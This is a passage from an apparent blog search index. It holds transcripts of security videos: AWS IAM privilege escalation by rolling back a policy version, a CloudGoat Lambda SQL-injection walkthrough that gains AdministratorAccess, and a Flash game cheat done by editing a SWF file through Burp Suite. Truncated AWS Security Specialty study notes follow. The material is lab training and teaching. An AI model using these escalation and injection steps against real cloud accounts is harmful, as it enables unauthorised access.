the aws iam help so iam is the module and of course we can just do help just like this and we can look at all the different commands that are associated with this module so we want to see the versions we want to list the version so let's look for all strings that contain version we have this get dash policy dash version which we just did and we have list policy versions right here so let's do that let's say we wanted more information on this specific command we can just do aws iam put in the command and then type in help just like this and this will show us all the different parameters that can be specified with this command and also the necessary parameter that you must have in order to successfully run this command so all of these are optional parameters and this is the necessary parameter so aws iam list dash policy dash versions and we want to give it a policy arn which we have up here and with this we can see all of the different versions so we have five versions and everything is set to false right now because we are using v1 right now but as we saw from our permissions we can set a default version which is where was it right here set default policy version so let's do aws before actually before we do that we we don't want to set a default version for any policy if we don't know what that policy entails say we set a default version as v2 and v2 had almost no permissions at all then we would be stuck at v2 so let's let's first look at all the different version ids using the command that we used before so here we were looking at v1 here's v2 now v2 allows us to list a bucket get an object and list all buckets for s3 and it's you could do this on all resources so say we suddenly set our default version as v2 then we would be stuck with these permissions and we would not be able to do it we would not be able to continue from that so let's look at the version three version three looks extremely interesting because we can perform any action on any resource let's look at version four version four we can perform any action on any or we cannot perform any action on any resources given that the source ip address is not any of these so this is not as good of a policy because it has these restrictions and it's also not allowing us to do it in the first place it says effect deny so let's look at version five here we can we are allowed to perform ian gets on any resource given that the resource was it were created after 2017 so this is not as good of a re as a policy because we have these restrictions and it's only i am get so version 3 looks like the most interesting policy because it has the most permissions we can do anything we want on any resource so let's set our default policy version as this version set dash default version as our default policy desk version dash desk version dash id we wanted v3 and our policy arn which was this up here and our profile of raynor so now we have those permissions and if we look at our uh let's okay i'll i'll do a who am i again with aws i am get this user here's our username and this is our main only managed policy at the moment but if you remember we could perform any action on any resource right now so let's try to give ourselves the administrator access and we could do that with the attach user policy command just like this attached as user dash policy and we need to provide a username in order to run this command and a policy arn so aws im attach user policy let's give our username and our policy arn so as the policy arn we want administrator access so we could look that up what the administrator access arn administrator access let's see we can go over here administrator access and here is the policy arn for administrators now we can give ourselves that policy and we provide our username and now if we list the same command we are now also the administrator so using this misconfigured user who has this set default policy version permission we were able to get administrator access because the other versions of the policy were too permissive we were able to put any action on any resource and therefore gain administrator access using the attach user policy command thank you for watching and i'll see you in the next video",
      "image": "/images/iam_privesc_by_rollback.png"
		},

		{
      "title"    : "Hacking in the Cloud - Cloudgoat: vulnerable_lambda",
      "category" : "Videos",
      "tags"     : "Videos, SQLi, Cloudgoat, AWS, Lambda",
      "url"      : "/videos/2022/06/10/Vulnerable-Lambda/",
      "date"     : "Jun 10, 2022",
      "content"  : "This is the first scenario in the CloudGoat series. We start off as a low-privileged user that can assume a role which gives Lambda:Invoke permissions. Using this permission we are able to exploit a high-privileged Lambda function via an SQL injection and obtain Administrator access.  Video context Enumerating IAM roles and policies Assuming lambda role  Further enumeration of IAM roles  Analyzing vulnerable lambda's source code  Exploiting lambda function  Demonstrating SQLi hello everybody this is zero day and this is the first scenario in the cloud go series you start off as a low privileged user named bilbo who can perform iem get in iam list on all resources after enumerating the cloud infrastructure you find that there is a role that you could actually assume and with this role you could actually invoke the vulnerable lambda function you find that there s actually an sql injection vulnerability in the lambda function and as it turns out it s quite handy that this vulnerable lambda function could has the iam attach user policy permissions on the bilbo user so after exporting the lambda function you could actually attach the administrator access managed policy to your user and essentially become an administrator we were provided the credentials of the first user bilbo this is the access key a secret key so let s just put that in i m just gonna configure it uh uh well let s call him bilbo because that s his name and we can put this as his axis key and this as his secret key and we ll keep the default region as us east one and okay so now we are the bilbo user so uh the first thing that we should try is just to enumerate the permissions of this user so we could do that with the iam um and let s do well let s let s list the attached user policies of this user so uh we need the username and to get that uh let s just do uh the caller identity which is basically like who am i but for aws i forgot to put bilbo here and we see that this is the username so let s just put that here and we are the bilbo user i m just gonna close this so it s bigger we see there are no attached user policies now what this looks for is the managed policies well maybe the bilbo user doesn t have manage policies as we can see there actually aren t any but it is possible that there are inline policies uh for this user for this particular identity to be exact uh and we could do that with the list user policies command so uh the main difference between list user policies and list attached user policies is this looks for uh managed policies and this looks for inline policies so this is the inline policy of the bilbo user so we can just get that policy and provide the iam module and the policy arn so get dash policy actually looks for the manage policies and as we figure it out there s actually no manage policies associated with the user so what we do instead is get dash user desk policy and then this looks at the inline policies inline policy is just a policy that s embedded in the identity of the user so two users cannot have the same inline policy the online policy might have the same permissions but it s not the same exact policy usually because of that managed policies are used instead of inline policies in a real environment because of the managed policy you can just change a certain permission of the policy and all the users who have that policy are affected this way with an identity policy if everybody has the same permissions for their specific identity if you wanted to change the permissions for every user you d have to manually go and change that so let s provide the username which we found was cg bilbo all of this and the policy name which if we go back up here it was this this is the inline policy and these are all the permissions for the bilbo user we can see that the bilbo user can do any get commands for any resource and it can list anything for any resource this is specifically for iam it could also simulate the custom policy or simulated principle policy this is not really interesting these two are just used for simulating permissions of a user so it doesn t it can t even create api calls it just tells you if you have permissions to do something or not they re not real api calls okay so we can see this but we can t do we can t escalate privileges with these these permissions alone but because we do have this list permission we should start trying to list maybe roles that are in this cloud infrastructure because maybe there is some role that we can assume so if we do this command we see here there s a lot that a lot to see but this is just a default uh aws police roles these are just aws roles these aren t customer managed or anything but if we look further down we see these two roles which are quite interesting this one and this one so if we look at this role we see that the bilbo user which is right here is allowed to do this command this sts assume roll command and this vulnerable lambda function it s quite convenient that they say that it s a vulnerable but this this vulnerable function can only be assumed from another lambda function so okay let s let s first just uh assume this role and the reason we re able to is because we are this user so let s just assume this role right here so aws sts assume dash role and let s just put our profile and we need the role arn and the role dash session dash name so this is the name right here which we copied and the role arn let s just copy that up here Music and we receive the credentials of this lambda function so that we can actually assume it so let s configure a profile let s call it lambda and let s put these credentials Music now note that there s also this session token credential right here but the aws configure profile command did not ask for a session token now we need this if i show you right here uh dash profile lambda it says the security token including the request is invalid well the reason is because we did not put the session token in so what you can do is you can just go into your credentials file now i won t do that here because i have some credentials in there that i don t want that are kind of secret so uh let s let s just put the session token using an echo command so aws underscore session underscore token equals all of this and let s put that there and let s put that at the end of the credentials file Music okay so now that we have that in there we can do the same command aws sts get dash color dash identity profile lambda and now that worked we didn t get that error okay so what can we even do with this role so remember that we were looking at the inline policies of the bilbo user now there s something that s just like that for users but except for roles so now that we are this role let s look at what the inline policies are for this role and we would do that with this command list dash role that s policies and let s put the role name which is uh Music here i ll just run that command really quick aws i am list roles profile bilbo the role name was this and the what was the other one that it asked for oh just the role name okay right because it s just the list role policies come in and this is the inline policy associated with this uh role now let s before we we look at what that is let s look at what the managed policies are of this so we would do that with list dash attached dash roll dash policies Music and we see there are no managed policies associated with this lambda function so just like with the user there was an inline policy but not a managed policy so let s try to get this policy so aws iam get destroyed policy let s put our profile there and it asks for a role name and a policy name so let s put our role name of this and the policy name we see right here is lambda invoker and we see that these are all the permissions of the lambda function or the lambda role that we assumed so we can list tags we can invoke functions this is a particularly interesting and we can get functions so with the get functions command you can actually get the code associated with the lambda function which is you know typically python you have the t bo2 three module uh you can also get policies lambda get policy and we have this list function event so you can perform all of these commands on this these specific resources on the vulnerable function that we saw earlier but also you can list functions for all resources so that s not just for this function uh and you can do an iam get iam list and basically you have all the permissions of the iam uh bilbo user and you have these assumed rule and which makes sense because we are the bilbo user so that s why we have these permissions but we also have these extra permissions right here from the role that we assumed so let s just uh get this function let s let s see before we try to even exploit this function let s see if it s even worth it that are there permissions associated with this function that we don t even have so this is the role name let s copy that and let s do the same thing we just did with our assumed role but let s do that with this function so aws iam get dash roll dash policy dash roll dash name and let s put our profile and policy name oh right let s first list Music whoops list that s real dash policies Music and this is the inline policy associated with that vulnerable lambda function so let s do that same thing where was it get dash roll and with this policy name so now we see that these are all the policies associated with this vulnerable lambda function we see the iam attach user policy which is particularly interesting because this is a super powerful permission with the attach user policy you are basically granting this role permissions to attach any kind of permissions to another user so maybe we could get the administrator privileges from exploiting this function if we were to somehow assume this role or somehow get the function to give us administrator privileges then we would have it because this function can do that on top of that it also has some s3 permissions logs not anything that interesting we can go back to get objects if this does not work but let s let s look into this function here because this definitely has permissions that we don t have with the assumed role so let s try to invoke this function so we go to aws lambda invoke recall that we have the permissions to do that uh and one moment uh aws lambda invoke function dash name so what is the function name let s let s go back and list the function names like clean up a little bit aws lambda list functions profile oh lambda and the function name is this uh well before we even invoke it we actually have to know what what this function even does so let s get the function first aws get that function lambda profile lambda and put the function name right here and it returns with this a long url and what this url is is just the url to download the source code of this vulnerable function so right here we can save it to download sure and let s move downloads to here make the resource and unzip it so these are are the this is the code associated with this function if we look at main pi which has the code associated with this function we see that the function asks for target policies and it says uh select policy name from policies where policy name equals whatever the input is and public equals true now they re nice enough to put all these comments here to show what is allowed so for example policy name this this would be allowed because the public is true but all of these aren t that interesting these are just read only access permissions what we really want is this administrator access but unfortunately it s false so you see if this is if the state if this is not a valid policy if we put a policy that s not valid such as administrator access then it says it s not an approved policy please only choose from the approved ones it s because of this public equals true thing but if we look closely this looks you know just like an sql statement and what we could do if you look here it looks quite insecure because we can actually break out of these quotation marks by just adding a quotation mark ourselves just like a basic uh sql injection attack so if we look further down is there anything interesting doesn t seem to be anything else so let s just put uh our payload in so aws lambda invoke let s put our profile and we want the function name and we want the out file so the function name was that vulnerable i should really save what the function is called but uh we came this far okay here it is here s the function name uh and we also want the out file let s just call it out txt Music and there was an error unhandled so let s just cap this let s see what it says it wants a payload of course we didn t input any payload so we could do a payload with the dash dash payload flag you could even if you re ever not sure about how a function works just type in the function so for example this invoke and then the help function after that so if we go down to payload we can see that this is like the format of the payload but a much better way a much cleaner way is to just create a payload file and just invoke the payload from that file so let s just call it payload json because everything is in json and we ll say that what what did the function want again they wanted Music a policy names and a username so let s put policy Music underscore names Music and let s put administrator access and we can put user underscore name and let s put our username which is something really long there it is copy this pastes and we close okay let s put this in and see what happens so payload uh our file which is payload json and let s see this time it didn t error out because we actually put a payload in so let s cut that it says a is not an approved policy please only choose from approved policies and don t cheat well a is the first letter of this uh policy name uh i think it s just enumerating it s looking for an array and as you can see it actually is for policy and target policies well we just inputted a string so for policy and target policy policy would be equal to a and then in the next for loop would be d and then m and then i so let s put that into a list just like this and let s see if it says that same thing Music administrator access is not an approved policy and that s because it was set to false if you remember right here and it only wants something that s true so let s do that basic uh sql injection attack by inputting a single quote and just commenting out the rest just like this and now let s see if that happens now before i even run this let s quickly just look at what our permissions are for our current bilbo user so if we go to back to where was it i didn t save the command okay well aws i am get dash user dash policy or first let s list it because i forgot what it was called yeah it s a good idea to save the outputs of your commands so you don t have to constantly do stuff like this and same thing with the sts oh at least i have that right here here s the username and this is the policy name so let s get the user policy and it was policy this right nope just types there we go so these are our current permissions uh and one other thing to show before before we uh do this payload is let s look at the attached user policies of profile bilbo now if you remember uh it doesn t have any managed policies but what we can do is through this function give it a manage policy just like administrator access this was the policy name here is the username Music so no attached policies there are no managed policies associated with this user administrator access is a managed policy uh so let s just put this payload in and it didn t error out let s cat and says all managed policies were applied as expected well let s see if we list the manage policies we see that we are now the administrator so we were able to exploit this vulnerable lambda function because of the bad uh validation on user input so right here it was easy to just put in a single quote so what we re really seeing here is us typing in administrator access and then a single quote here and then space dash which is just a comment in sql so basically the sql statement is seeing just this part right here select policy name from policies where policy name equals administrator access so it s like okay it says okay here you go here s administrator access and we got the administrator access permissions so thank you for watching this video i hope it was a it was helpful in understanding the scenario and also about iam permissions and their security it s very important to to make sure that when you re creating lambda functions especially when a user can invoke it that all the lambda functions are secure because just because a lambda function well is not an iam policy i impulses is the main security weakness in cloud infrastructure that doesn t mean that a vulnerable aimed or that a lambda function cannot be vulnerable so thank you for watching this video and i ll see you in the next one",
      "image": "/images/vulnerable_lambda.png"
		},

		{
      "title"    : "How To Hack Any Flash Game",
      "category" : "Videos",
      "tags"     : "Videos, Flash",
      "url"      : "/videos/2022/01/03/How-To-Hack-Any-Flash-Game/",
      "date"     : "Jan 03, 2022",
      "content"  : "This video showcases how to hack any flash game using BurpSuite and JPEXS Decompiler  Note that the information showed in this video should not be used for any illegal purposes  00 00   Video context 00 49   Tools used for the hack 02 22   Swords and Sandals 2 before hack 05 04   Clearing cache and downloading SWF file 08 48   Decompiling SWF file and modifying the code 17 02   Serving the modified SWF file to the server response 17 49   Playing our hacked version of Swords and Sandals 2 hello everybody this is xerox d4y and i ll be showing you how to hack any flash player game uh one of the games that i used to play a lot was this game called swords and sandals two played it about like 10 years ago all the time and i used to go on this website called hacked games where you could just get any kind of uh perk that you wanted for free and just get like like as if whenever you had a skill point you could just increase your skill points and not have any kind of repercussions of doing that and i ve always wanted to know how that kind of thing is done and um i recently figured out how to do stuff like that and i wanted to show it to all of you so uh one of the things that you ll need to perform this kind of um hack is burp suite so this is the burp suite tool this is one of the tools you re going to need it s completely free i ll put a download link in the description another link is this decompiler you ll need that because you re going to be decompiling swf files i ll get into that later it sounds complicated but it s not complicated so this is one of the other tools that you re going to need and for that specific tool you re going to need this file called playerglobal swc um this playerglobal swc file is going to be put into this program right here you just gotta go to settings click on advanced settings and then click on paths and wherever you downloaded that playerglobal swc file you just put that in right here by first clicking on this folder navigating to and then you put it in there i just downloaded this one the 15 0 because that just corresponds to this version of jpegs s i ll also put this in the description and this is just the download link for this jpegs s thing so everything is free you can easily download it and do it yourself okay so here s this game swords and sandals 2  i ll just first show you how it looks before you hack it and then i ll show you after i ll put chapters in this video so if you don t want to see how it looks before you can just skip so anyways i m gonna play the game here so it s loading the game info and that s actually an important part that we re going to be intercepting later  Music  okay uh then we just click play create new gladiator we have nine skill points to start out with every time we increase our skill we get one less skill point okay let s just put it all in strength um and just click check to start the game so there s all this intro it s not that important you fight this guy called fearful prisoner then you just kind of defeat him uh look um at the fact that we start with 30 health points and 110 mana so uh when we hack this game we re going to want to start off with more points than that and maybe even start off with a higher level than just level one so we defeated him we received 2500 gold and we re now level two and we get four skill points to put into our skill sheet so we just increase it there press check and day one glorious freedom uh an important thing to note is don t do any of this stuff uh you know if it s illegal what i m showing you right now is completely legal and it should not be used for any kind of illegal purposes anyways uh so let s go to this uh armory we can just get a breastplate uh note how when we hover over this item it says on the top left there this item is demo locked so somehow the game is realizing that this is just the demo version and because of that it s not letting us buy stuff like this or you know anything that s really good and that looks kind of cool it s not letting us buy it okay so that s just kind of how the game looks like you uh have an arena you have stats and all of that look at how we re level two we have 126 out of 480 experience and we re five six 180 pounds all right we can change all of that quite easily uh so first thing we re gonna have to do is clear the cache and the reason that s important is because right now in our cache is the swf file and all that stands for is um small web format and it s just an adobe flash file that was used for a whole bunch of flash games like this one uh so what we re gonna want is to modify it to make us instantly like level 50 or something okay so uh we go to our cache click on preferences uh then i ll just type in cash over here and here we are clear data i m going to clear all of this and just before i refresh this page i want to intercept it using foxy proxy so i m going to want to turn on burp suite um this is also another like really nice extension to have on mozilla firefox you just um install it using the extension um navigator thing on on firefox so you can just click on options and add your your own uh there s a lot of you know blogs uh and videos on how to set up foxy proxy in burp suite so i will not go over that uh okay so um let s put on actually before we do that before we do that we cleared the cache so let s just reload the page here now before clicking on play game because remember after we click on play game that s when sw the swf file is served let s intercept it let s put uh our burp suite on so that all of the traffic goes through port 8080 which i configured to be burp suite uh i ll turn on intercept to intercept any kind of responses and i ll click on play game so after clicking on play game we re performing a get request on this file w dot w asm it s not that important now we just click on forward and this is the swf file that we were talking about so it s 29 swf so now a really important part is because we re doing all of this client side it s important to intercept the response to this quest because we re going to be performing a get request to get this swf file so after we click forward the server is sending us the swf file so this is where we want to intercept that response here is the compiled swf file this is it all of this so what i m going to do is copy this to a file i ll call it sandals 2 swf and i ll save it and i ll go here and there it is there s the sandals swf if we do a files on this it says that it s just data and then the reason it s data and not seen as some kind of special swf file is because of all of this data here is where the swf file starts so let s delete all of this until we get to that part okay here we go uh now if you perform the same command on it it will say that it s a macrometer flash data okay so now we re going to put this into jpex s file open sandals2 swf  Music  okay so now it s decompiled uh when hacking any kind of flash player game you re going to get the script kind of folder and this is where the real meat of the game is this is what you re going to want to be looking for uh so there s all these different buttons uh remember this check mark button that was in the game well there s many different check mark buttons in the game depending on what kind of function it does there s one for buying an item there s one for just saying yes or no to uh what kind of name you want um so let s look at like what these buttons do we press on what happens when you release so this is a button for game over whenever you die there s this check mark button you click on it game over your characters erased and whatnot now here s the 720 button and with uh hacking video games you just got to be really persistent looking at all of these different buttons seeing what looks really nice the 720 button is interesting in particular because we have a leveled up function here and it tells us what happens whenever we level up so when we level up we go from level one to level two because of this plus one here well let s not wait until we level up let s go straight to level 50 or level let s say level 49 right below 50  um let s go straight to level 49 that way we don t have to wait till we level up and here is the variable for your level okay so let s just put that straight up here at the start we click on edit action script and let s put it right here root game hero level let s make us level 49  um yeah that looks pretty good all right let s just save this okay um let s look at some other buttons i m just going down here to look at so many more buttons here s another check uh here s a plus which if you remember in the character sheet this is what our skill points were about and whenever we hit that plus our strength went up by one but our skill points went from i think we started at nine then it went to eight and every single time we press the plus we got less and less points that s because of this minus equals if we change that to plus equals then instead of losing a skill point every single time we click on that plus button we instead gain a skill point and how about instead of gaining just one strength we gain 100 that would be fun okay let s do that um see we got a minus that s not that interesting another plus what s this other plus about well this other plus is about our agility our speed uh okay i ll just put i ll just do the same thing and i mean you could do the same thing for all of these different skill points it s i ve done it before and i will send a link on in the description as well of my github which will have the hacked version of the swf and it will have something like this for every single skill i m not going to show in this video but you get the idea how to do it you just go here click on plus change that and so forth so okay we have that um another thing if you remember there was a demo thing we couldn t buy armor because it was part of we re we re in a demo and we don t have the full version so what we can do is click on tools text search and let s see where in this code is this demo where is it saying that we are in demo mode so these are all the different places in the code where the word demo appears i ve already done this before so i can tell you that here is really where it s saying that we are in demo mode we are in global gamemode demo you can see like here for example uh where is it ah here bubble tech sorry friend the tournament name is locked in the demo version if tournament number and global name equals demo uh okay so what does it look like in the full version of the game let s see what where that might appear if if global game mode is a demo equals demo then that s just demo mode but what is the full version what s the word that we use for that so i m just gonna go here and see where it says something like fool um there we go global game mode equals full so we verified that whenever we put global game mode equals full that that means full version okay so let s just go back here and let s change this word to full edit action script and type in full okay let s see what else uh so we changed the strength um let s see what where we can put gold because we started off with think like 2500 something like that so let s find where gold is so let s do this type in gold and we see tons of different options let s click on this one and here is our gold uh this is the variable root game hero gold pieces is the variable that we re looking for and um let s just give ourselves a ton of money so we saw that 720 is where the game kind of starts uh so let s just put right here at the start of the game um one three three seven one three three seven gold so now when we start the game we should have that much gold okay um and i think that that looks good um i don t know if i want to do anything else  Music  i think this was also an interesting button uh you need to distribute all of your skill points before continuing let s change step points greater than zero to i don t know something huge so we never get that text okay i think that s good let s just uh save this here then what we ll do is this request instead of having this compiled by a compiled swf running on our client side let s have our hacked version so to do that i m going to just cut this using ctrl x i m going to delete everything here paste back what i cut and click on paste from file first i right clicked on burp suite then clicked on paste from file and then click sales2 swf and it s just loading here because i think it was like a two megabyte file or something like that okay let s forward this and turn off intercept you don t need to intercept anything anymore and let s see if our hack worked let s see if it worked so create new gladiator okay as soon as we clicked strength we gained a hundred strength and we gained a skill point okay so now we re so big that our head isn t even on the screen um same thing here gains a hundred and anyways you could do the same thing with the tag defense all of that um okay let s just i ll put the rest right here let s just go here oh this is just the intro again we it says we re level one which means our other code did not get executed yet but we start off with 170 health instead of i think it was 110 before or something like that and we just did 603 damage on that person uh we have leveled up to level 50  okay and now uh doesn t show how much gold you have if you go to the armory we have one three three seven one three three seven gold and let s see if we re still in demo mode we are not because when we hover over this it no longer says we have to be in demo mode to buy this so we can now buy cool looking armor now let s buy this one okay well there s that that was easy okay so um you get the idea so you could do this with any kind of flash game i know that flash games are not really served anymore because of their vulnerabilities like in 2011 alone there were 63 vulnerabilities there s also buffalo overflow vulnerabilities some rce which is remote code execution vulnerabilities that s the worst and there s also denial of service attacks all kinds of different attacks that were performed due to vulnerabilities of adobe flash but in any case as you can see that doesn t mean it s dead that there s no more swf files served by servers anymore the it could even work within emulators which is what i demonstrated here so anyways thank you for watching remember don t do anything illegal and yeah thanks for watching this video bye",
      "image": "/images/how-to-hack-any-flash-game.png"
    },

    {
      "title"    : "AWS Security Specialty Notes",
      "category" : "",
      "tags"     : "Notes, AWS Security",
      "url"      : "/2022/03/15/AWS-Security-Specialty-Notes/",
      "date"     : "Mar 15, 2022",
      "content"  : "layout  posttitle   AWS Security Specialty Notesdescription  Notes that I wrote in preparation for the Certified AWS Security   Specialty exam  These notes cover fundamental information about the AWS infrastructure  It is recommended that you install Obsidian and download the zip file instead  This way you can navigate through these notes a lot more quicklydate    2022 03 15 image     images 0xd4y logo gray png tags     AWS SecurityThese are all the notes that I took after reading the entire exam guide for the AWS Ceritifed Security   Specialty exam  ISBN 13  978 1789534474   It is recommended that you install Obsidian and download the  a href  https   github com 0xd4y notes blob main AWS 20  20Security 20Specialty AWS notes zip  zip file  a  instead  as this will allow you to quickly and easily navigate through these notesAWS Security SpecialtyThese are all the notes that I took after reading the entire exam guide for the AWS Ceritifed Security   Specialty exam  ISBN 13  978 1789534474   It is recommended that you install Obsidian and download the zip file instead  as this will allow you to quickly and easily navigate through these notesThings to Know on Exam  need to know logging   how to handle monitoring and logging   how to automate responses to incidents found in those logs  know troubleshooting   if logs from lambda are not showing up in cloudwatch  why is thisKnowledge Domain     of ExamIncident Response   12 Logging and Monitoring   20 Infrastructure Security   26 Identity and Access Management   20 Data Protection   22scenario based   automating response to security issues  know format of policies in json  order in which thigs are resolved   explicit deny  explicit allow  default implicit deny  know cloudwatch  KMS  IAM  cloudtrail  etc   Table of Contents  AWS Questions  AWS Cloud Security   Specialist Misc Misc   Section 2  Security Responsibility   Access Management  Access Management  Access Policies  Federated and Mobile Access  Shared Responsibility ModelSection 3  Security   A Layered ApproachConfiguring Infrastructure Security  Implementing Application Security  Securing EC2 Instances  DDoS Protection  Incident Response  Secure Connections to AWS EnvironmentSection 4  Monitoring  Logging  and Auditing  Implementing Logging Mechanisms  Auditing and GovernanceSection 5  Best Practices and Automation  Automation  Discovering Security Best PracticesSection 6  Encryption and Data Security  Managing Key Infrastructure  Managing Data SecurityIdentity and Access Management  IAM   AWS Contents  AWS Questionscontains details and credentials of root user account  access keys should not be configured for root user  additional user with relevant privileges should be created instead    limit access methods to root accountGroups  groups are associated with set of permissions allowing members of that group to inherit those permissions   groups don t have credentials associated with it   object within IAMRoles  associated set of permissions that allows access to AWS resources   not associated with users or groups   sort of works like discord roles    Examples of roles      Service Roles  allows other AWS services to perform actions on one s behalf  only exist in account in which they were created  can t be used for cross account access   when using EC2 roles for deploying and running EC2 instances  it is best practice to associate EC2 instances with a role  removes the need to store credentials on any instance    role itself   instance profile    container for role    used to pass data to EC2 instance User Roles   when user assumes a role  their current permissions get temporarily replaced by the role s permissions Web Identity Federate Role   allows a single sign on  SSO  approach   federated access means user has been authenticated by external source     can be through well known identity providers  IDPs  such as Amazon  Google  or Facebook SAML 2 0 federated roles   allows creation of roles that have been federated through one s internal corporate directory    the external authentication system is one s own corporate directory of users    e g  Microsoft Active Directory  MSAD    Access Policies    AWS Contents     AWS Questions Access Policies  define who or what can or can t access AWS resourcesu Policy Structure  u1  Version   shows version of policy language2  Statement   acts as group for parameters in json structure3  Sid   statement identification4  Effect   can be either  allow  or  deny     allows or denies access to resource5  Action   list of actions to be allowed or denied access to    action is first defined by service and then preceded with action6  Resource   provides Amazon Resource Name  ARN     tells which resource the permissions apply to 7  Condition   optional   dictates under what conditions policy is in effectPasted image 20220131192503 png  Policy Types     Identity based Policies   attached to IAM user  group  or role   controls what actions an identity  users  groups of users  roles  can perform on which resources and under what conditions    e g  allowing user John to run the EC2  RunInstances  action    can be AWS managed  customer managed or in line policies      AWS managed    policies that are created and managed by AWS      Customer managed    custom policy that is made by the customer       In line     added directly to user  group  or role    deleted when the identity is deleted    Resource based Policies   very similar to in line policies except they are attached to resources instead of identities   can be attached to buckets and S3 objects   lets you specify who has access to resource and what actions they can perform on it   policy looks the same as in the example policy  however includes a  Principal  parameter    identifies user  role  account  or federated user that permissions should be applied to    Permissions boundaries   governs maximum permissions an identity based policy can associate with any user or role    Access Control Lists  ACLs    can attach to buckets and S3 objects   similar to resource based policies   use only to control cross account access from different AWS account or public access    Organization SCPs   SCP stands for Service Control Policy   used by AWS organizations to manage multiple AWS accounts   similar to permissions boundaries within identity objects    they also set maximum permission level that can be given to members of an AWS account or organization unit  OU     restrict permissions for resource based and identity based policies    restricts permissions  doesn t grant permissionsPolicy evaluationDetermination of permissions when accessing resource 1  Authentication2  Determine context of request   request processed and associated permissions are defined   actions  resources  principals  environment data  and resource data are examined3  Policy evaluation   policy types evaluated in order of identity based  resource based  IAM permissions boundaries  and SCPs4  Permission Result   access granted or denieddeny actions overrule allow actions   Federated and Mobile Access  AWS Contents  AWS Questions Federated and Mobile Accessused for providing resource to a large amount of users   unfeasible to create individual IAM accounts for every user to access the resource  allows access to AWS resources without IAM user account  credentials federated by identity provider  IDP    e g  Microsoft Active Directory Accounts  Google  Facebook  etcu Security Assertion Markup Language  SAML   u   allows secure exchange of authentication data between different domains  users security tokens between an IdP and a SAML consumerSocial Federation    Amazon Cognito  made for enabling secure authentication and access control for new and existing users accessing web or mobile applications  generate tokens after  authentication that manages access   best practice when creating applications that require social IdPs for authenticationTwo main Components1  User Pools   scalable user directories   allow users to login to mobile application      Pasted image 20220203163059 png2  Identity Pools   assigns permissions to user to access AWS resources  uses temporary credentials      Pasted image 20220203163348 pngShared Responsibility Model  AWS Contents  AWS Questions Shared Responsibility ModelThree different shared responsibility models 1  Infrastructure   most common model   covers infrastructure as a Service  IaaS  services such as Elastic Compute Cloud  EC2       Pasted image 20220131154703 png   AWS responsible for security of the cloud  customer is responsible for security in the cloud2  Container   customer does not have access to some of infrastructure level components such as the operating system   examples of services in container model  Elastic MapReduce  EMR   Relational Database Service  RDS   Elastic Beanstalk      Pasted image 20220131161816 png   AWS has more responsibilities with this model than the infrastructure model    platform and application management  operating system  and network configuration are responsibility of AWS3  Abstract      Pasted image 20220131162045 png   AWS responsible for even more security    in addition manages server side encryption and network traffic protection   examples of services in abstract model  Simple Queue Service  SQS   DynamoDB  and S3   accessed through endpoints    no access to operating system  infrastructure  or platform running these services  container   Configuring Infrastructure Security  AWS Contents  AWS Questions Configuring Infrastructure Security   Virtual Private Cloud  VPC   private section of AWS network  can be public faceSubnets   can only reside in a single availability zone  e g  only in eu west 1bAZ    each subnet should be configured for a specific use  i e  segmentation   this is security best practice    e g  subnet can contain only application servers  other subnet can contain only database servers  etc    falls within CIDR  classless inter domain routing  block of VPC    e g  if VPC CIDR block is  10 0 0 0 16   subnets can be the following  10 0 1 0 24   10 0 1 0    Network address  10 0 1 1    AWS routing  10 0 1 2    AWS DNS  10 0 1 3    AWS future use  10 0 1 255    Broadcast address 10 0 2 0 24  10 0 3 0 24 etc     note the first address is reserved for the network address  and the last address is reserved for the broadcast address    AWS reserves the first three host addresses in any subnetfirst host address reserved for internal AWS VPC routingsecond host address for AWS DNSthird host address for future use    therefore  251  out of 256  available host addresses for customer use in  16 subnetu Route Table  u   table subnet uses for routing traffic   if no route table is defined  default VPC route table is usedFlow Logs Tab   captures IP traffic sent between network interfaces of subnet   captured within CloudWatchInternet Gateway  IGW   helps create a public subnet  allows traffic to traverse from subnet in VPC to internet and vice versaNetwork Access Control Lists  NACLs   virtual network level firewalls  stateless  default NACL created when VPC is created   all traffic allowed by default  therefore default NACL is insecure   two fundamental components 1  Inbound Rules 2  Outbound Rules  final rule of NACL is that any traffic that isn t categorized by any of the rules gets dropped  rules read in ascending order until match is foundSecurity Groups  similar to NACLs  provide virtual firewall  except operates at instance level rather than network level  associated with instances rather than subnets  controls traffic to and from instances within VPC  stateful  no field for  Allow  or  Deny  traffic  as all rules in security group are assumed to be allowed  traffic not categorized as such is dropped    works as a whitelist for traffic  all rules evaluated before decision is madeBastion Hosts  used to gain access to instances that reside within private subnets  bastion host resides within public subnet  hardened EC2 instance with restrictive controls  acts as ingress gatewayu Public Subnet  u   a subnet associated with a route table pointing to an internet gateway  IGW  with a destination address of 0 0 0 0 0no packet is directly exchanged between internet and IPs inside private subnet  it goes first through the bastion hostNAT Instances and NAT Gateways  kind of like the opposite of bastion host  allows instances in private subnets to initiate a connection out to the internet via NAT resource  blocks all inbound public initiated traffic  allows private instances access to internet   usually used for maintenance related tasks such as updatesNAT Gateway   AWS managed resource   offers enhanced bandwidth and availability in comparison to NAT instance   requires far less administrative configuration than NAT instance  DDoS Protection   AWS Contents     AWS Questions DDoS Protection     protections include AWS Shield Advanced   3000 a month  and AWS Shield Standard  free     DDoS PatternsSYN Floods   abuses three way handshake when connection is being established between client and server    Pasted image 20220213185859 png     the final ACK completes the handshake  but this is dropped in SYN Flood attack to leave connection openHTTP Floods   many GET or POST requests sent to serverPing of Death  POD    oversized ping packets sent to target   maximum size of packet is 65 535 bytes  but with fragmentation you can send a lot of data to targetAWS Shield  specify ARN of resources and services Shield should protect  Elastic IP Address  EIP  should be specified first for EC2 instance in order to use Shield on it    AWS Shield Standard  free  helps protect against common DDoS attacks operating at network and transport layersAWS Shield Advanced    3000 per month   application traffic monitoring   monitors network  transport  and application layers   comes with AWS DDoS Response Team  known as DRT Rate Based Rules   counts number of requests received from IP address over 5 minutes   can define max number of request from singe IP within 5 minutes  must be over 2000 AWS CloudFront and Amazon Route 53   edge services    recommended to use these in conjunction with Shield to further decrease chances of compromise   helps detect DDoS attacks   allows for layer 3  4  and 7 attack mitigation  also 6 in the case of CloudFront used in conjunction with AWS WAF    Implementing Application Security   AWS Contents     AWS Questions Implementing Application Security  AWS WAFThree primary elements 1  Web ACL  Access Control List    contains rules and rule groups  defines what should be inspected within requests 2  Rules   defines specific criteria for what web ACL should be inspecting and what action to take  allow block count 3  Rule Groups   allows you to group a set of rulesAWS Firewall Manager   manages WAF rules across multi account environment when using AWS Organizations   uses WAF rules that are grouped together within a rule groupManaging Security Configuration of ELBs  ELB stands for Elastic Load Balancing   controls  manages  and distributes incoming requests to a specified resource group   can be internal or internet facing   internal ELBs only 